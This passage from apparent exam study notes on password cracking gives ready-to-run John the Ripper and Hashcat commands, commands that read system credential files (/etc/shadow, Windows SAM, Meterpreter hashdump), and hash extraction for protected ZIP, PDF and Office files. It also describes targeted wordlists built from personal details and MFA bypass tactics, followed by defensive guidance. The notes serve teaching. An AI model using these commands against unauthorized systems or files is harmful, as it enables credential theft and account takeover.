# Pattern-based (with fixed characters)
crunch 8 8 -t Password@@ -o passwords.txt
# @ = lowercase, , = uppercase, % = number, ^ = symbol

# Generate 6-digit PINs
crunch 6 6 0123456789 -o pins.txt

# Estimate size before generating
crunch 8 8 abcdefghijklmnopqrstuvwxyz -s
```

#### 3. CUPP — Common User Passwords Profiler

**CUPP** generates personalized wordlists based on information about the target (name, birthdate, pet, hobbies, etc.).

```bash
cupp -i
# Interactive — answers questions about the target
# Produces: target_profiler.txt
```

#### 4. Keyword Mutator (Kwprocessor)

Generates keyboard-walk passwords (e.g., `qwerty123`, `1qaz2wsx`).

```bash
kwprocessor --keymap-base keyboard-us --output keyboard-walks.txt
```

### Brute Force vs Dictionary Attack

| Aspect | Brute Force Attack | Dictionary Attack |
|--------|-------------------|-------------------|
| **Approach** | Try every possible character combination | Try words from a pre-defined list |
| **Speed** | Very slow | Fast |
| **Coverage** | Exhaustive (will find password eventually) | Only finds passwords in the wordlist |
| **Time for 8-char** | Days to years (depending on complexity) | Minutes to hours |
| **Resource Usage** | Extremely high | Low |
| **Success Rate** | 100% (given infinite time) | ~70% for common lists (rockyou) |
| **When to Use** | When password policy is known, password is random | Most real-world passwords |
| **Detection Risk** | High (account lockout, rate limiting) | Low (fewer attempts) |

### Attack Strategies

#### Strategy 1: Dictionary First
Start with rockyou.txt (most common passwords) → quick wins on weak passwords.

#### Strategy 2: Rule-Based Attack
Apply mutation rules to dictionary words to catch variations.

```bash
# John the Ripper — apply rules
john --wordlist=rockyou.txt --rules=best64 hash.txt

# Hashcat — apply rules
hashcat -a 0 -m 1000 hash.txt rockyou.txt -r best64.rule
```

**Common Mutation Rules**:
- Append numbers: `password` → `password123`
- Capitalize first letter: `password` → `Password`
- Replace characters: `password` → `p@ssword` (leet speak)
- Append year: `password` → `password2023`
- Reverse: `password` → `drowssap`
- Toggle case: `password` → `pAsSwOrD`

#### Strategy 3: Combinator Attack
Combine two words from wordlist.

```bash
# John the Ripper — combinator
john --wordlist=words1.txt --wordlist=words2.txt --stdout | john --stdin hash.txt

# Hashcat — combinator attack
hashcat -a 1 -m 1000 hash.txt words1.txt words2.txt
# Combines: cat + fish = catfish, sun + flower = sunflower
```

#### Strategy 4: Mask Attack (Known Pattern)

```bash
# Known: Password starts with capital, ends with 2 digits
hashcat -a 3 -m 1000 hash.txt ?u?l?l?l?l?l?l?d?d
# ?u = uppercase, ?l = lowercase, ?d = digit

# Known: 8-character password, ends with digit
hashcat -a 3 -m 1000 hash.txt ?a?a?a?a?a?a?a?d
# ?a = all printable ASCII
```

**Hashcat Mask Characters**:
| Mask | Meaning |
|------|---------|
| `?l` | Lowercase (a–z) |
| `?u` | Uppercase (A–Z) |
| `?d` | Digit (0–9) |
| `?s` | Special (!@#$%^&*) |
| `?a` | All printable (?l?u?d?s) |
| `?b` | Byte (0x00–0xff) |

#### Strategy 5: Hybrid Attack
Dictionary + Mask (append/prepend to dictionary words).

```bash
# Append 2 digits to each word in rockyou
hashcat -a 6 -m 1000 hash.txt rockyou.txt ?d?d
# password → password12, password99

# Prepend 1 uppercase to each word
hashcat -a 7 -m 1000 hash.txt ?u rockyou.txt
# password → Password (uppercased first letter)
```

### Wordlist Optimization Tips
1. **Remove duplicates** — `sort -u wordlist.txt > cleaned.txt`
2. **Filter by length** — `awk 'length >= 8 && length <= 16' wordlist.txt > filtered.txt`
3. **Convert to lowercase** — `tr '[:upper:]' '[:lower:]' < wordlist.txt > lowercase.txt`
4. **Sort by frequency** — Use **PACK** (Password Analysis and Cracking Kit) to analyze and split wordlists by probability.

### SPPU Exam Tip
> For "Explain wordlists and attack strategies", define wordlists, list **common wordlists** (rockyou, SecLists), show how to create **custom wordlists** (CeWL, Crunch, CUPP), compare **brute force vs dictionary attack** in a table, and explain **4 attack strategies** (dictionary with rules, combinator, mask, hybrid).

---

## 4.8 Cracking Passwords with John the Ripper — Breaking ZIP, PDF, and Local System Passwords

### What is John the Ripper?
**John the Ripper (John)** is one of the most popular **open-source password cracking tools**. It supports hundreds of hash types and includes a powerful **rule engine** for mutating wordlist entries.

### Basic John Usage

```bash
# Basic command
john hash.txt

# Specify hash format
john --format=nt hash.txt

# Use wordlist
john --wordlist=rockyou.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Specify rules
john --wordlist=rockyou.txt --rules hash.txt
```

### Step 1: Extracting Hashes

#### Windows (SAM)
```bash
# Dump hashes from Windows SAM (need SYSTEM privileges)
samdump2 SYSTEM SAM > sam_hashes.txt

# Or using Metasploit
meterpreter > hashdump
```

#### Linux (/etc/shadow)
```bash
# Unshadow — combine passwd and shadow
unshadow /etc/passwd /etc/shadow > combined_hashes.txt

# Now crack
john --wordlist=rockyou.txt combined_hashes.txt
```

#### ZIP Files
```bash
# Extract hash from ZIP file
zip2john protected.zip > zip_hash.txt

# Crack the hash
john --wordlist=rockyou.txt zip_hash.txt
```

#### PDF Files
```bash
# Extract hash from PDF
pdf2john protected.pdf > pdf_hash.txt

# Crack the hash
john --wordlist=rockyou.txt pdf_hash.txt
```

#### RAR Files
```bash
# Extract hash from RAR
rar2john protected.rar > rar_hash.txt

# Crack the hash
john --wordlist=rockyou.txt rar_hash.txt
```

#### Office Documents (Word, Excel, PPT)
```bash
# Extract hash from Office file
office2john protected.docx > office_hash.txt

# Crack the hash
john --wordlist=rockyou.txt office_hash.txt
```

### Step 2: Understanding Hash Formats

```bash
# Identify hash type
john hash.txt
# John automatically detects format if possible

# List supported formats
john --list=formats

# List only certain formats
john --list=formats | grep -i nt
```

### Step 3: Cracking Configuration

```bash
# Incremental (brute force) mode — very slow
john --incremental hash.txt

# Specify min/max password length
john --incremental --min-length=8 --max-length=12 hash.txt

# Use built-in rules
john --wordlist=rockyou.txt --rules=Single hash.txt
john --wordlist=rockyou.txt --rules=Jumbo hash.txt

# External rules (custom .conf)
john --wordlist=rockyou.txt --rules=KoreLogicRules hash.txt
```

### Practical Examples

#### Example 1: Cracking Windows NTLM Hashes

```bash
# Hash format (from SAM or Metasploit):
# admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Save to file (John extracts NTLM automatically)
echo "admin:31d6cfe0d16ae931b73c59d7e0c089c0" > ntlm_hash.txt

# Crack with rockyou
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hash.txt

# Check results
john --show --format=nt ntlm_hash.txt
```

#### Example 2: Cracking Linux SHA-512 Hashes

```bash
# /etc/shadow line:
# john:$6$sXi7PgKr$StLmFuB...:18000:0:99999:7:::

# Unshadow
unshadow /etc/passwd /etc/shadow > linux_hashes.txt

# Crack
john --wordlist=rockyou.txt linux_hashes.txt
```

#### Example 3: Cracking ZIP File Password

```bash
# Create test
echo "secret data" > test.txt
zip --password MySecret123 test.zip test.txt

# Extract hash
zip2john test.zip > zip_hash.txt

# View extracted hash
cat zip_hash.txt

# Crack
john --wordlist=rockyou.txt zip_hash.txt

# Show result
john --show zip_hash.txt
# test.zip:MySecret123:::
```

#### Example 4: Cracking PDF File Password

```bash
# Extract hash from PDF
pdf2john protected.pdf > pdf_hash.txt

# Crack with rules
john --wordlist=rockyou.txt --rules pdf_hash.txt

# Show cracked password
john --show pdf_hash.txt
```

### John the Ripper Modes

| Mode | Command | Description | Speed |
|------|---------|-------------|-------|
| **Wordlist** | `--wordlist=file.txt` | Try passwords from wordlist | Fast |
| **Single Crack** | `--single` | Use login/GECOS info as password guesses | Very fast |
| **Incremental** | `--incremental` | Brute force (all combinations) | Very slow |
| **External** | `--external=name` | Custom cracking modes from config | Configurable |
| **Markov** | `--markov` | Statistical password generation | Moderate |

### Status and Performance

```bash
# View cracking progress
john --status

# Show all cracked passwords
john --show hash.txt

# Resume interrupted session
john --restore

# Test cracking speed
john --test

# Use multiple CPU cores
john --fork=4 hash.txt
```

### John vs Hashcat

| Aspect | John the Ripper | Hashcat |
|--------|-----------------|---------|
| **Platform** | Primarily CPU | GPU (OpenCL/CUDA) |
| **Speed** | Slower (CPU-bound) | Much faster (GPU-parallel) |
| **Rule Engine** | Very powerful, many built-in rules | Powerful, similar syntax |
| **Auto-Detection** | Yes (auto-detect hash format) | No (must specify `-m`) |
| **Hash Extraction** | Built-in tools (zip2john, pdf2john, etc.) | No extraction tools |
| **Ease of Use** | Easy (auto-detect, simpler syntax) | Moderate (need hash mode number) |
| **Best For** | General purpose, small to medium jobs | Large-scale cracking, GPU clusters |

### SPPU Exam Tip
> For "Explain password cracking with John the Ripper", show **step-by-step** process: extract hash (with specific tools like zip2john, pdf2john, unshadow) → crack with wordlist → view results. Give **at least 3 practical examples** (Windows NTLM, Linux shadow, ZIP file). Compare with **Hashcat**.

---

## 4.9 Countermeasures & Password Security Best Practices — Strong Password Policies, Salting, MFA

### Password Security Best Practices

#### 1. Strong Password Policy

| Policy Element | Recommendation | Rationale |
|----------------|---------------|-----------|
| **Minimum Length** | 12–16 characters minimum | Longer passwords exponentially harder to crack |
| **Complexity** | Uppercase + lowercase + digits + symbols | Increases keyspace |
| **No Common Patterns** | No "password", "123456", "qwerty" | Easily guessed |
| **No Personal Info** | No name, birthdate, pet name, etc. | Easily guessed from OSINT |
| **Password Expiration** | Every 90 days (NIST now recommends only on compromise) | Limits exposure window |
| **Password History** | Remember last 10 passwords | Prevents password reuse |
| **Account Lockout** | 5 failed attempts → 15-minute lock | Prevents online brute-force |

**NIST SP 800-63B Current Recommendations**:
- **Minimum 8 characters** (12+ recommended).
- **No arbitrary complexity requirements** (encourage passphrases instead).
- **Check against known breached passwords** (haveibeenpwned API).
- **Expire password only if compromised** (not arbitrarily every 90 days).
- **Allow copy-paste** in password fields (encourages password managers).

#### 2. Password Salting

**Always salt passwords before hashing.**

```python
# Python — bcrypt (salt is automatically included)
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
# $2b$12$LJ3m4ys3Lk0TSwHZ9eWQzO...

# Verification
bcrypt.checkpw(input_password.encode(), stored_hash)
```

**Salt Requirements**:
| Requirement | Why |
|-------------|-----|
| **Cryptographically random** | Prevents predictability |
| **Sufficient length** | 16+ bytes (128+ bits) recommended |
| **Unique per user** | Same password → different hash |
| **Unique per password change** | Same user, new password → different hash |

#### 3. Multi-Factor Authentication (MFA)

**Types of MFA**:

| Factor Type | Examples | Security Level |
|-------------|----------|----------------|
| **SMS/Text OTP** | Code sent via SMS | Low (SIM swap attacks) |
| **TOTP (Time-based OTP)** | Google Authenticator, Authy | Medium |
| **Push Notification** | Duo, Microsoft Authenticator | Medium |
| **Hardware Token** | YubiKey, Titan Security Key | High (phishing-resistant) |
| **Biometric** | Fingerprint, Face ID | Medium (can be bypassed) |
| **FIDO2/WebAuthn** | Passkeys, platform authenticators | High (phishing-resistant) |

**MFA Bypass Techniques** (ethical hacker should know):
- **MFA Fatigue** — Spam user with push notifications until they accept.
- **SIM Swapping** — Attacker convinces carrier to transfer victim's number.
- **OTP Interception** — Malware on phone reads SMS.
- **Backup Codes** — Insecure storage of recovery codes.
- **Legacy Protocols** — IMAP/SMTP may not enforce MFA.

#### 4. Password Managers

**Benefits**:
- Generate and store **unique, complex passwords** for every site.
- **Encrypted vault** (master password is the only one to remember).
- **Auto-fill** prevents keylogging.
- **Breach monitoring** (1Password, Bitwarden, LastPass).

**Examples**: Bitwarden (open-source), 1Password, KeePass, Apple iCloud Keychain.

#### 5. Additional Security Measures

| Measure | Description |
|---------|-------------|
| **Rate Limiting** | Limit login attempts per IP/user (e.g., 5 attempts per minute) |
| **CAPTCHA** | Distinguish humans from bots (reCAPTCHA, hCaptcha) |
| **Breached Password Detection** | Check against haveibeenpwned API at registration |
| **Geolocation/IP Analysis** | Alert on login from unusual location |
| **Device Fingerprinting** | Detect login from unknown device |
| **Progressive Delay** | Increase delay after each failed attempt (2s, 4s, 8s, ...) |
| **Account Recovery** | Secure recovery flow — email verification, identity proofing |

#### 6. Secure Password Storage for Developers

```python
# DO NOT use
hashlib.md5(password.encode()).hexdigest()        # MD5 — broken
hashlib.sha1(password.encode()).hexdigest()        # SHA-1 — broken
hashlib.sha256(password.encode()).hexdigest()      # SHA-256 — fast (no salt)

# DO use
import bcrypt
bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# OR
from argon2 import PasswordHasher
ph = PasswordHasher()
hashed = ph.hash(password)

# OR
import hashlib, os
salt = os.urandom(32)  # 32 bytes salt
hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
```

#### 7. Defense Against Common Password Attacks

| Attack | Defense |
|--------|---------|
| **Online Brute Force** | Rate limiting, account lockout, CAPTCHA |
| **Offline Dictionary** | Strong hashing (bcrypt/argon2), long passwords |
| **Rainbow Table** | **Salting** (makes precomputation infeasible) |
| **Credential Stuffing** | Check against breached passwords list, MFA |
| **Phishing** | User awareness training, MFA (hardware token) |
| **Keylogging** | Password manager auto-fill, 2FA |
| **Shoulder Surfing** | Screen privacy filter, biometric unlock |
| **Social Engineering** | Security awareness, verification protocols |

### Enterprise Password Policy Example

```
PASSWORD POLICY — ExampleCorp

1. Minimum length: 12 characters
2. Complexity: At least 1 uppercase, 1 lowercase, 1 digit, 1 symbol
3. Password history: Last 12 passwords remembered
4. Account lockout: 5 failed attempts → 30-minute lockout
5. MFA: Required for all accounts (TOTP or hardware token)
6. Password manager: Corporate Bitwarden instance
7. Breach check: Passwords checked against haveibeenpwned API
8. Session timeout: 15 minutes of inactivity → require re-auth
9. Admin accounts: Separate from daily-use accounts
10. Password change: On compromise only (not scheduled)
```

### SPPU Exam Tip
> For "Explain password security best practices and countermeasures", cover **6 areas**: strong password policy (with NIST guidelines), salting (why and how), MFA (types and bypasses), password managers, rate limiting/CAPTCHA, and secure storage (code example). End with an **enterprise policy example**.

---

## Quick Revision Summary

### Web Vulnerabilities Quick Reference

| Vulnerability | Type | Impact | Mitigation |
|---------------|------|--------|------------|
| **SQL Injection** | Injection | Data theft, RCE | Parameterized queries |
| **XSS** | Client-side | Session hijacking, phishing | Output encoding, CSP |
| **CSRF** | Request forgery | Unauthorized actions | CSRF tokens, SameSite cookies |
| **IDOR** | Authorization | Unauthorized data access | Object-level access control |
| **Command Injection** | Injection | RCE | Input validation, avoid shell calls |
| **File Upload** | Input validation | RCE, defacement | Extension + content validation |
| **XXE** | XML injection | File reading, SSRF | Disable external entities |
| **SSTI** | Template injection | RCE | Template engine sandboxing |

### Password Cracking Commands Cheatsheet

```bash
# John the Ripper
john hash.txt                              # Auto-detect + crack
john --wordlist=rockyou.txt hash.txt        # Wordlist attack
john --rules hash.txt                       # With rules
john --show hash.txt                        # Show cracked
zip2john file.zip > hash.txt                # ZIP hash extraction
pdf2john file.pdf > hash.txt                # PDF hash extraction
office2john file.docx > hash.txt            # Office hash extraction
unshadow passwd shadow > hash.txt           # Linux hash extraction

# Hashcat
hashcat -m 1000 -a 0 hash.txt rockyou.txt    # NTLM + dictionary
hashcat -m 0 -a 0 hash.txt rockyou.txt        # MD5 + dictionary
hashcat -m 1400 -a 0 hash.txt rockyou.txt     # SHA-256 + dictionary
hashcat -m 3200 -a 0 hash.txt rockyou.txt     # bcrypt + dictionary
hashcat -a 3 hash.txt ?u?l?l?l?l?l?d?d       # Mask attack
hashcat -a 6 hash.txt words.txt ?d?d          # Hybrid (append digits)
hashcat -a 7 hash.txt ?u words.txt            # Hybrid (prepend uppercase)
```

### Password Security Comparison

| Algorithm | Salt | Speed | Recommended | Use Case |
|-----------|------|-------|-------------|----------|
| **MD5** | Optional | Instant | **No** | Legacy only |
| **SHA-1** | Optional | Very fast | **No** | Legacy only |
| **SHA-256** | Yes (manual) | Fast | **No for passwords** | Integrity, not passwords |
| **bcrypt** | Auto | Slow (configurable) | **Yes** | Web apps |
| **scrypt** | Auto | Slow + memory-hard | **Yes** | High security |
| **argon2** | Auto | Slow + memory-hard + parallel | **Yes (best)** | Modern apps |

### Secure Coding — Key Principles

```
1.  Never trust user input          → Validate everything
2.  Use parameterized queries      → Prevent SQL injection
3.  Encode all output               → Prevent XSS
4.  Use CSRF tokens                 → Prevent CSRF
5.  Hash passwords with bcrypt      → Secure storage
6.  Use HTTPS everywhere            → Encrypt in transit
7.  Set secure cookie flags         → HttpOnly, Secure, SameSite
8.  Implement proper access control → Prevent IDOR
9.  Log and monitor                 → Detect attacks
10. Keep dependencies updated       → Prevent known exploits
```

### Sample 5-Mark Questions (SPPU Pattern)

1. **Explain the three-tier web application architecture with security concerns for each layer.**
2. **What is SQL Injection? Explain types and mitigation techniques.**
3. **Explain XSS. Differentiate between Stored, Reflected, and DOM-based XSS.**
4. **What is CSRF? Explain with an example. Compare CSRF and XSS.**
5. **Explain input validation, authentication, and secure session management.**
6. **Describe the methodology for web application penetration testing.**
7. **Explain secure coding practices with code examples in any language.**
8. **What is password salting? Why is it important? Explain with example.**
9. **Compare brute force and dictionary attacks. Which is more effective and why?**
10. **Explain how John the Ripper is used to crack ZIP, PDF, and system passwords.**
11. **Define MFA. Explain types of MFA and how they can be bypassed.**
12. **Explain password security best practices for enterprises.**

---

### Mnemonics

**OWASP Top 10 (first letters)** → **B**roken, **C**rypto, **I**njection, **D**esign, **M**isconfig, **O**utdated, **A**uth, **S**oftware, **L**ogging, **S**SRF
> **Mnemonic**: "**B**ig **C**ats **I**n **D**ark **M**asks **O**ften **A**ct **S**neaky **L**ike **S**nakes"

**SQL Injection Types** → **I**n-band, **B**lind, **O**ut-of-band
> **Mnemonic**: "**I** **B**elieve **O**nions are tasty"

**XSS Types** → **S**tored, **R**eflected, **D**OM
> **Mnemonic**: "**S**anta **R**eally **D**elivers"

**Password Cracking Strategies** → **D**ictionary, **B**rute Force, **R**ules, **C**ombinator, **M**ask, **H**ybrid
> **Mnemonic**: "**D**ad **B**ought **R**ed **C**ars **M**aking **H**istory"

**Secure Cookie Flags** → **S**ecure, **H**ttpOnly, **S**ameSite
> **Mnemonic**: "**S**afe **H**ttp **S**essions"
